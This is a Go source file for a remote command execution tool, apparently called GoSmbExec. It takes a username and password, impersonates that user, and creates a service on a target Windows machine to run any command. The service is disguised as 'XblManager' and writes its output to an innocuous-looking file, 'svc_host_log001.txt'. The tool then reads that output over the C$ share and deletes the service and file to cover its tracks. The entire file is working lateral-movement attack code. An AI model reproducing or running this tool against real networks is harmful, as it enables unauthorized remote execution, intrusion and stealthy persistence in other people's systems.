package main

import (
	"errors"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"runtime"
	"syscall"

	"github.com/hirochachacha/go-smb2"
	"github.com/latortuga71/GoSmbExec/pkg/winapi"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

func DeleteService(targetMachine, serviceName string) error {
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return err
	}
	defer serviceMgr.Disconnect()
	service, err := serviceMgr.OpenService(serviceName)
	if err != nil {
		return err
	}
	defer service.Close()
	service.Control(svc.Stop)
	VerbosePrint("[+] Stopping Service")
	err = service.Delete()
	if err != nil {
		return err
	}
	VerbosePrint("[+] Deleted Service")
	return nil
}

func CreateService(targetMachine, serviceName, commandToExec string) error {
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return errors.New("Failed to logon.")
	}
	VerbosePrint("[+] Successfully Logged on.")
	defer serviceMgr.Disconnect()
	c := mgr.Config{}
	serviceBinary := fmt.Sprintf("%%COMSPEC%% /Q /c echo %s ^> \\\\127.0.0.1\\C$\\Users\\Public\\Documents\\svc_host_log001.txt 2^>^&1 > %%TMP%%\\svc_host_stderr.cmd & %%COMSPEC%% /Q /c %%TMP%%\\svc_host_stderr.cmd & del %%TMP%%\\svc_host_stderr.cmd", commandToExec)
	c.BinaryPathName = serviceBinary
	service, err := CreateServiceWithoutEscape(serviceMgr.Handle, serviceBinary, serviceName)
	if err != nil {
		return err
	}
	VerbosePrint("[+] Created Service")
	defer service.Close()
	VerbosePrint("[+] Started Service")
	service.Start()
	return nil
}

func VerbosePrint(message string) {
	if verbose {
		fmt.Println(message)
	}
}

var user string
var pass string
var domain string
var host string
var command string
var verbose bool

func main() {
	flag.StringVar(&user, "u", "", "Username")
	flag.StringVar(&pass, "p", "", "Password")
	flag.StringVar(&domain, "d", ".", "Domain")
	flag.StringVar(&host, "h", "localhost", "Host")
	flag.StringVar(&command, "c", "whoami", "Command to run on target")
	flag.BoolVar(&verbose, "v", false, "Verbose Flag")
	flag.Parse()
	if user == "" || pass == "" {
		fmt.Printf("Missing User or Pass arguments.\n")
		flag.PrintDefaults()
		return
	}
	VerbosePrint("[+] Starting.")
	runtime.LockOSThread()
	err := LogonUserToAccessSVM(domain, user, pass)
	if err != nil {
		log.Fatal(err)
	}
	out, err := SmbExec(host, domain, user, pass, command)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Printf("%s", out)
	runtime.UnlockOSThread()
}

func LogonUserToAccessSVM(domain, user, pass string) error {
	var hToken syscall.Handle
	ok, err := winapi.LogonUser(user, domain, pass, 9, 3, &hToken)
	if !ok {
		VerbosePrint("[-] Logon User Failed")
		return err
	}
	worked, err := winapi.ImpersonateLoggedOnUser(windows.Token(hToken))
	if !worked {
		VerbosePrint("[-] ImpersonateLoggedOnUser Failed")
		return err
	}
	return nil
}

func SmbExec(node, domain, user, pass, command string) (string, error) {
	err := CreateService(node, "XblManager", command)
	if err != nil {
		return "", err
	}
	err = DeleteService(node, "XblManager")
	if err != nil {
		return "", err
	}
	payloadPath := `Users\Public\Documents\svc_host_log001.txt`
	data, err := ReadFileOnShare(node, user, pass, domain, "C$", payloadPath)
	if err != nil {
		return "", err
	}
	return string(data), nil
}

func CreateServiceWithoutEscape(handle windows.Handle, serviceBinaryPath, serviceStartName string) (*mgr.Service, error) {
	binPath := windows.StringToUTF16Ptr(serviceBinaryPath)
	startName := windows.StringToUTF16Ptr(serviceStartName)
	h, err := windows.CreateService(handle, startName, startName, windows.SERVICE_ALL_ACCESS, 0x00000010, mgr.StartManual, mgr.ErrorIgnore, binPath, nil, nil, nil, nil, windows.StringToUTF16Ptr(""))
	if err != nil {
		return nil, err
	}
	return &mgr.Service{Name: serviceStartName, Handle: h}, nil
}

func ReadFileOnShare(machine, user, pass, domain, shareName, fileToRead string) (string, error) {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:445", machine))
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	var d *smb2.Dialer
	d = &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			Domain:   domain,
			User:     user,
			Password: pass,
		},
	}
	s, err := d.Dial(conn)
	if err != nil {
		return "", err
	}
	defer s.Logoff()
	share, err := s.Mount(fmt.Sprintf("\\\\%s\\%s", machine, shareName))
	if err != nil {
		return "", err
	}
	defer share.Umount()
	f, err := share.Open(fileToRead)
	if os.IsNotExist(err) {
		return "", errors.New("File doesnt exist.")
	}
	f.Close()
	data, err := share.ReadFile(fileToRead)
	if err != nil {
		return "", err
	}
	VerbosePrint("[+] Read output from file")
	err = share.Remove(fileToRead)
	if err != nil {
		return fmt.Sprintf("ERROR: %v Failed to delete file but still got output.\n%s", err, string(data)), nil
	}
	VerbosePrint("[+] Deleted Temp File")
	return string(data), nil
}
